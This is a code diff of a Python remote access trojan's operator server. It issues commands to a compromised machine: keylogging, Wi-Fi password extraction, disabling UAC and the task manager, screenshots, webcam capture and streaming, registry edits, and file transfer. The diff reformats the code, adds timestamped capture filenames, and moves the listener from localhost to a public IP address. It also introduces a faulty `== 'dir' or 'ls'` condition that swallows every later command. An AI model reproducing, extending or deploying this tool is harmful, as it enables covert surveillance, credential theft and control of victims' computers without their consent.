@@ -1,23 +1,22 @@
-import random
-import socket, os
+import socket
+import os
+from datetime import datetime
 
 class RAT_SERVER:
     def __init__(self, host, port):
         self.host = host
         self.port = port
-    
+
     def build_connection(self):
         global client, addr, s
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((self.host, self.port))
         s.listen(5)
-        print("[*] Waiting for the client...")
+        print("[*] Waiting for the client... ⏰")
         client, addr = s.accept()
-        print()
         ipcli = client.recv(1024).decode()
-        print(f"[*] Connection is established successfully with {ipcli}")
-        print()
-    
+        print(f"[*] Connection established with {ipcli} 💣")
+
     def server(self):
         try:
             from vidstream import StreamingServer
@@ -26,15 +25,15 @@ class RAT_SERVER:
             server.start_server()
         except:
             print("Module not found...")
-    
+
     def stop_server(self):
         server.stop_server()
-    
+
     def result(self):
         client.send(command.encode())
         result_output = client.recv(1024).decode()
         print(result_output)
-    
+
     def banner(self):
         print("======================================================")
         print("                       Commands                       ")
@@ -132,9 +131,9 @@ startfile <file>          start file
 readfile <file>           read from file
         ''')
         print("======================================================")
-    
+
     def execute(self):
-        self.banner()
+        # self.banner()
         while True:
             global command
             command = input('Command >>  ')
@@ -150,123 +149,128 @@ readfile <file>           read from file
                     print(result_output)
                 client.close()
                 s.close()
-            
+
             elif command == 'drivers':
                 self.result()
-            
+
             elif command == 'setvalue':
                 client.send(command.encode())
-                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
-                root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
+                const = str(input(
+                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                root = str(
+                    input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                 key = str(input('Enter the key name: '))
-                value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
+                value = str(
+                    input('Enter the value of key [None, 0, 1, 2 etc.]: '))
                 client.send(const.encode())
                 client.send(root.encode())
                 client.send(key.encode())
                 client.send(value.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command == 'delkey':
                 client.send(command.encode())
-                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                const = str(input(
+                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to key: '))
                 client.send(const.encode())
                 client.send(root.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command == 'createkey':
                 client.send(command.encode())
-                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                const = str(input(
+                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to key: '))
                 client.send(const.encode())
                 client.send(root.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command == 'disableUAC':
                 self.result()
-            
+
             elif command == 'reboot':
                 self.result()
-            
+
             elif command == 'usbdrivers':
                 self.result()
-            
+
             elif command == 'volumeup':
                 self.result()
-            
+
             elif command == 'volumedown':
                 self.result()
-            
+
             elif command == 'monitors':
                 self.result()
-            
+
             elif command[:4] == 'kill':
                 if not command[5:]:
                     print("No process mentioned to terminate")
                 else:
                     self.result()
-            
+
             elif command == 'extendrights':
                 self.result()
-            
+
             elif command == 'geolocate':
                 self.result()
-            
+
             elif command == 'turnoffmon':
                 self.result()
-            
+
             elif command == 'turnonmon':
                 self.result()
-            
+
             elif command == 'setwallpaper':
                 client.send(command.encode())
                 text = str(input("Enter the filename: "))
                 client.send(text.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command == 'keyscan_start':
                 client.send(command.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command == 'send_logs':
                 client.send(command.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command == 'stop_keylogger':
                 client.send(command.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command[:7] == 'delfile':
                 if not command[8:]:
                     print("No file to delete")
                 else:
                     self.result()
-            
+
             elif command[:10] == 'createfile':
                 if not command[11:]:
                     print("No file to create")
                 else:
                     self.result()
-            
+
             elif command == 'tasklist':
                 self.result()
-            
+
             elif command == 'ipconfig':
                 self.result()
-            
+
             elif command[:7] == 'writein':
                 if not command[8:]:
                     print("No text to output")
                 else:
                     self.result()
-            
+
             elif command == 'sendmessage':
                 client.send(command.encode())
                 text = str(input("Enter the text: "))
@@ -275,129 +279,129 @@ readfile <file>           read from file
                 client.send(title.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command == 'profilepswd':
                 client.send(command.encode())
                 profile = str(input("Enter the profile name: "))
                 client.send(profile.encode())
-                result_output = client.recv(2147483647).decode()
+                result_output = client.recv(10000).decode()
                 print(result_output)
-            
+
             elif command == 'profiles':
                 self.result()
 
             elif command == 'cpu_cores':
                 self.result()
-            
+
             elif command[:2] == 'cd':
-                if not command[3:]: 
+                if not command[3:]:
                     print("No directory")
                 else:
                     self.result()
-            
+
             elif command == 'cd ..':
                 self.result()
-            
+
             elif command[1:2] == ':':
                 self.result()
-            
-            elif command == 'dir':
+
+            elif command == 'dir' or 'ls':
                 self.result()
-            
+
             elif command == 'portscan':
                 self.result()
-            
+
             elif command == 'systeminfo':
                 self.result()
-            
+
             elif command == 'localtime':
                 self.result()
-            
+
             elif command[:7] == 'abspath':
                 if not command[8:]:
                     print("No file")
                 else:
                     self.result()
-            
+
             elif command[:8] == 'readfile':
                 if not command[9:]:
                     print("No file to read")
                 else:
                     client.send(command.encode())
-                    result_output = client.recv(2147483647).decode()
+                    result_output = client.recv(10000).decode()
                     print("===================================================")
                     print(result_output)
                     print("===================================================")
-            
+
             elif command.startswith("disable") and command.endswith("--keyboard"):
                 self.result()
-            
+
             elif command.startswith("disable") and command.endswith("--mouse"):
                 self.result()
-            
+
             elif command.startswith("disable") and command.endswith("--all"):
                 self.result()
-            
+
             elif command.startswith("enable") and command.endswith("--all"):
                 self.result()
-            
+
             elif command.startswith("enable") and command.endswith("--keyboard"):
                 self.result()
-            
+
             elif command.startswith("enable") and command.endswith("--mouse"):
                 self.result()
-            
+
             elif command[:7] == 'browser':
                 client.send(command.encode())
                 quiery = str(input("Enter the quiery: "))
                 client.send(quiery.encode())
                 result_output = client.recv(1024).decode()
                 print(result_output)
-            
+
             elif command[:2] == 'cp':
                 self.result()
-            
+
             elif command[:2] == 'mv':
                 self.result()
-            
+
             elif command[:8] == 'editfile':
                 self.result()
-            
+
             elif command[:5] == 'mkdir':
                 if not command[6:]:
                     print("No directory name")
                 else:
                     self.result()
-            
+
             elif command[:5] == 'rmdir':
                 if not command[6:]:
                     print("No directory name")
                 else:
                     self.result()
-            
+
             elif command[:10] == 'searchfile':
                 self.result()
-            
+
             elif command == 'curpid':
                 self.result()
-            
+
             elif command == 'sysinfo':
                 self.result()
-            
+
             elif command == 'pwd':
                 self.result()
-            
+
             elif command == 'screenshare':
                 client.send(command.encode("utf-8"))
                 self.server()
-            
+
             elif command == 'webcam':
                 client.send(command.encode("utf-8"))
                 self.server()
-            
+
             elif command == 'breakstream':
                 self.stop_server()
-            
+
             elif command[:9] == 'startfile':
                 if not command[10:]:
                     print("No file to launch")
@@ -407,53 +411,54 @@ readfile <file>           read from file
             elif command[:8] == 'download':
                 try:
                     client.send(command.encode())
-                    file = client.recv(2147483647)
+                    file = client.recv(10000)
                     with open(f'{command.split(" ")[2]}', 'wb') as f:
                         f.write(file)
                         f.close()
                     print("File is downloaded")
-                except: 
+                except:
                     print("Not enough arguments")
 
             elif command == 'upload':
                 client.send(command.encode())
                 file = str(input("Enter the filepath to the file: "))
-                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
+                filename = str(
+                    input("Enter the filepath to outcoming file (with filename and extension): "))
                 data = open(file, 'rb')
-                filedata = data.read(2147483647)
+                filedata = data.read(10000)
                 client.send(filename.encode())
                 print("File has been sent")
                 client.send(filedata)
-            
+
             elif command == 'disabletaskmgr':
                 self.result()
-            
+
             elif command == 'enabletaskmgr':
                 self.result()
-            
+
             elif command == 'isuseradmin':
                 self.result()
-            
+
             elif command == 'help':
                 self.banner()
-            
+
             elif command == 'screenshot':
                 client.send(command.encode())
-                file = client.recv(2147483647)
-                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
+                file = client.recv(10000)
+                path = f'{os.getcwd()}/screenshot_{datetime.now().strftime("%m_%d_%Y_%H.%M.%S")}.png'
                 with open(path, 'wb') as f:
                     f.write(file)
                     f.close()
                 path1 = os.path.abspath(path)
                 print(f"File is stored at {path1}")
-            
+
             elif command == 'webcam_snap':
                 client.send(command.encode())
-                file = client.recv(2147483647)
-                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
+                file = client.recv(10000)
+                with open(f'{os.getcwd()}/webcam_{datetime.now().strftime("%m_%d_%Y_%H.%M.%S")}.png', 'wb') as f:
                     f.write(file)
                     f.close()
-                print("File is downloaded")
+                print("File is downloaded")                              
 
             elif command == 'exit':
                 client.send(command.encode())
@@ -463,7 +468,11 @@ readfile <file>           read from file
                 s.close()
                 client.close()
 
-rat = RAT_SERVER('127.0.0.1', 4444)
+            else:
+                print('Unacceptable server command')
+
+
+rat = RAT_SERVER('50.116.8.102', 4444)
 
 if __name__ == '__main__':
     rat.build_connection()
